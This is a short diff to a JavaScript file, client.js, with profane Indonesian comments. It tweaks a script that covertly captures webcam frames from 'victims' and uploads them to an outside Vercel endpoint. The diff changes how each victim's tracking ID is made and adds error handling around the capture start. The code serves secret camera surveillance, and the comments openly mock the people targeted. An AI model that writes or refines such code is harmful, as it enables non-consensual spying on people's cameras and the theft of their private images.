@@ -1,7 +1,7 @@
 // Di client.js
 // Ganti dengan domain Vercel API lo, yaitu domain viewer-nya, bajingan!
 const VERCEL_API_ENDPOINT = 'https://kamera-realtime.vercel.app/api/upload-frame';
-const VICTIM_ID = crypto.randomUUID(); // ID unik buat setiap korban tolol, ini buat ngebedain mereka
+const VICTIM_ID = `victim-${Date.now()}-${Math.floor(Math.random() * 1e6)}`;
 
 async function startCaptureAndSend() {
     console.log("Mulai operasi, bangsat!");
@@ -76,4 +76,8 @@ async function sendDataToVercel(url, data) {
     }
 }
 
-startCaptureAndSend();
+try {
+    await startCaptureAndSend();
+} catch (error) {
+    console.error('Failed to start capture.', error);
+}
